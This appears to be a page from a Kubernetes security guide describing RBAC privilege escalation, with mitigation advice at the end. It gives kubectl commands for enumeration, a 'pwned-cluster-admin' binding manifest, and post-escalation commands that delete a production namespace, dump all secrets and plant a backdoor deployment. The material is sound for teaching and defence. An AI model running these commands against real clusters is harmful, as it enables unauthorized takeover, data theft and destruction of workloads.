---
sidebar_position: 8
title: "Insecure RBAC Permissions"
description: "Understanding how overly permissive RBAC configurations can lead to unauthorized access and privilege escalation in Kubernetes."
---

# Insecure RBAC Permissions

**Role-Based Access Control (RBAC)** is a core security mechanism in Kubernetes, defining which users or service accounts can perform which actions on which resources. When RBAC policies are overly permissive or misconfigured, they can become a critical attack vector for unauthorized access and full cluster compromise.

---

## Exploitation Scenario: Privilege Escalation via Misconfigured RBAC

An attacker leverages weak RBAC configurations to escalate privileges and gain full control over the Kubernetes cluster.

---

### Step 1: Enumerate Existing RBAC Roles and Bindings

Using any account that has permission to list RBAC objects, the attacker inspects roles and bindings:

```bash
kubectl get roles,rolebindings,clusterroles,clusterrolebindings -A
```

They look for signs of:

- Bindings to `cluster-admin`
- Use of wildcards (`'*'`) for verbs or resources
- Broad permissions granted to non-admin users

---

### Step 2: Impersonate a More Privileged User

If the user has `impersonate` privileges or is bound to a wildcard rule, they test their effective access:

```bash
kubectl auth can-i '*' '*' --as=admin
```

If the output is:

```
no
```

They cannot yet impersonate the `admin` user. But they may still be able to create bindings if RBAC is lax.

---

### Step 3: Create a Malicious ClusterRoleBinding

If the current user can bind a `ClusterRole`, the attacker creates a new binding that escalates privileges.

**Malicious binding:**

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: pwned-cluster-admin
subjects:
- kind: User
  name: admin
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

Apply it:

```bash
kubectl apply -f pwned-cluster-admin.yaml
```

---

### Step 4: Verify Escalated Access

Now that the `admin` user is bound to `cluster-admin`, test again:

```bash
kubectl auth can-i '*' '*' --as=admin
```

Expected output:

```
yes
```

This confirms that the attacker (or anyone impersonating `admin`) now has unrestricted access across the cluster.

---

### Step 5: Perform Arbitrary Cluster Actions

With full `cluster-admin` access, the attacker can now do the following:

```bash
kubectl exec -it <pod-name> -- /bin/sh
kubectl delete namespace production
kubectl get secrets -A
kubectl create deployment backdoor --image=alpine -- /bin/sh -c 'sleep infinity'
```

They can even install or modify CRDs, escalate service accounts, or tamper with kube-system components.

---

## Result

The attacker gains **full administrative access** over the Kubernetes cluster. This enables:

- Arbitrary command execution
- Data exfiltration
- Persistent backdoors
- Deletion of workloads or namespaces

---

## Mitigation Steps

To prevent abuse of RBAC:

- Apply the **principle of least privilege**
- Avoid using `'*'` in `verbs` and `resources`
- Scope `Roles` to namespaces instead of using `ClusterRoles` when possible
- Regularly audit RBAC policies and bindings
- Prevent creation of new `ClusterRoleBindings` without approval
- Block wildcard impersonation rights

For more comprehensive mitigation techniques, refer to:

➡ **[Securing RBAC Permissions](/docs/best_practices/cluster_setup_and_hardening/insecure_rbac_permissions_mitigation)**
